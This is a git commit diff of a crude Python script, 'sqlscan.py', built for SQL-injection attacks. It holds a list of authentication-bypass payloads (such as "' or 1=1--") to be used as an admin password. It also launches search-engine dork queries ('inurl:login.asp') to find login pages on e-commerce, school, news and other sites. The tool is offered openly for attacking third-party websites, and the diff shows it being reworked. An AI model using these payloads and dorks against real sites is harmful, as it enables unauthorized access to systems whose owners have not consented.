d38f5fb9d94337cabc60bc55b1ba0872ede3333e
WWW313NET <75071180+WWW313NET@users.noreply.github.com>
2020-12-09 15:43:15 +0100

    Update sqlscan.py

--- sqlscan.py
+++ sqlscan.py
@@ -8,8 +8,7 @@ print("       |_||___|      |___| |   | |  \|")
 print("Version 2.0")
 print("enter a number")
 print("1 >> generate a random query")
-print("2 >> update a SQL scan")
-print("3 >> finds sites vulnerable to SQL injection")
+print("2 >> finds sites vulnerable to SQL injection")
 query = ["admin'--", "1'or'1'='1", "' or 0=0 --", '" or 0=0 --', "or 0=0 --", "' or 0=0 #", '" or 0=0 #', "or 0=0 #", "' or 'x'='x", '" or "x"="x', "') or ('x'='x", "' or 1=1--", '" or 1=1--', "or 1=1--", "' or a=a--", '" or "a"="a', "') or ('a'='a", '") or ("a"="a', 'hi" or "a"="a', 'hi" or 1=1 --', "hi' or 1=1 --", "hi' or 'a'='a", "hi') or ('a'='a", 'hi") or ("a"="a', "1' OR '1'='1"]
 try:
     sql = int(input("number: "))
@@ -18,124 +17,81 @@ try:
         print("username: admin")
         print("password: " + passwd)
 
+    elif(sql == 2):
+        print("e-commerce-1")
+        print("news-2")
+        print("blog-3")
+        print("sports-4")
+        print("computer science-5")
+        print("car-6")
+        print("gaming-7")
+        print("streaming-8")
+        print("CMS-9")
+        print("food-10")
+        print("channel-11")
+        print("school-12")
+        print("agency-13")
+        print("social network-14")
+        print("tv-15")
 
-    if(sql == 2):
-        os.chdir("cd ..")
-        os.system("git clone https://github.com/WWW313NET/sqlscan")
-        print("SQL scan is update")
-    if(sql == 3):
-        print("select a dork:")
-        print("1")
-        print("2")
-        print("3")
-        print("4")
-        print("5")
-        print("6")
-        print("7")
-        print("8")
-        print("9")
-        print("10")
-        print("11")
-        print("12")
-        print("13")
-        print("14")
-        print("15")
-        print("16")
-        print("17")
-        print("18")
-        print("19")
-        print("20")
-        print("21")
-        print("22")
-        print("23")
-        print("24")
+    dork = int(input("select vulnerable site type:"))
 
-    dork = int(input("select a dork: "))
-
-    if(dork == 1):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:login.asp", shell=True)
+    if(dork < 1):
+        print("enter a number greater than 1")
+    elif(dork == 1):
+        subprocess.call("firefox https://duckduckgo.com/?q=e-commerce+inurl:login.asp", shell=True)
 
     elif(dork == 2):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:admin_login.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=news+inurl:login.asp", shell=True)
+
     elif(dork == 3):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:adminlogon.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=blog+inurl:login.asp", shell=True)
+
 
     elif(dork == 4):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:admin_logon.asp", shell=True)
+        subprocess.call("firefox https://duckduckgo.com/?q=sports+inurl:login.asp", shell=True)
 
-    
+
     elif(dork == 5):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:\admin/admin_login.php", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=computer+science+inurl:login.asp", shell=True)
+
 
     elif(dork == 6):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=car+inurl:login.asp", shell=True)
+
     elif(dork == 7):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/login.asp", shell=True)
+        subprocess.call("firefox https://duckduckgo.com/?q=gaming+inurl:login.asp", shell=True)
 
-    
+
     elif(dork == 8):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/logon.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=streaming+inurl:login.asp", shell=True)
+
     elif(dork == 9):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/adminlogin.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=CMS+inurl:login.asp", shell=True)
+
     elif(dork == 10):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/adminlogon.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=food+inurl:login.asp", shell=True)
+
     elif(dork == 11):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin_login.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=channel+inurl:login.asp", shell=True)
+
     elif(dork == 12):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin_logon.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=school+inurl:login.asp", shell=True)
+
     elif(dork == 13):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin/admin.asp", shell=True)
-    
+        subprocess.call("firefox https://duckduckgo.com/?q=agency+inurl:admin.asp", shell=True)
+
     elif(dork == 14):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin/login.asp", shell=True)
+        subprocess.call("firefox https://duckduckgo.com/?q=social+network+inurl:login.asp", shell=True)
 
-    
+
     elif(dork == 15):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin/logon.asp", shell=True)
+        subprocess.call("firefox https://duckduckgo.com/?q=tv+inurl:login.asp", shell=True)
 
-    
-    elif(dork == 16):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin/adminlogin.asp", shell=True)
 
-    
-    elif(dork == 17):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin/adminlogon.asp", shell=True)
+    elif(dork >= 16):
+        print("enter a number less than 15")
 
-    
-    elif(dork == 18):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin/admin_login.asp", shell=True)
-
-    
-    elif(dork == 19):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/admin/admin_logon.asp", shell=True)
-
-    
-    elif(dork == 20):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/administrator/admin.asp", shell=True)
-
-    
-    elif(dork == 21):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/administrator/login.asp", shell=True)
-
-    
-    elif(dork == 22):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:/administrator/logon.asp", shell=True)
-
-    
-    elif(dork == 23):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:root/login.asp", shell=True)
-    
-    elif(dork == 24):
-        subprocess.call("firefox https://duckduckgo.com/?q=inurl:admin/index.asp", shell=True)
     else:
         print("you have an error in your syntax SQL")
 
@@ -143,8 +99,3 @@ try:
 
 except:
     print("you have an error in your syntax SQL")
-
-
-
-
-
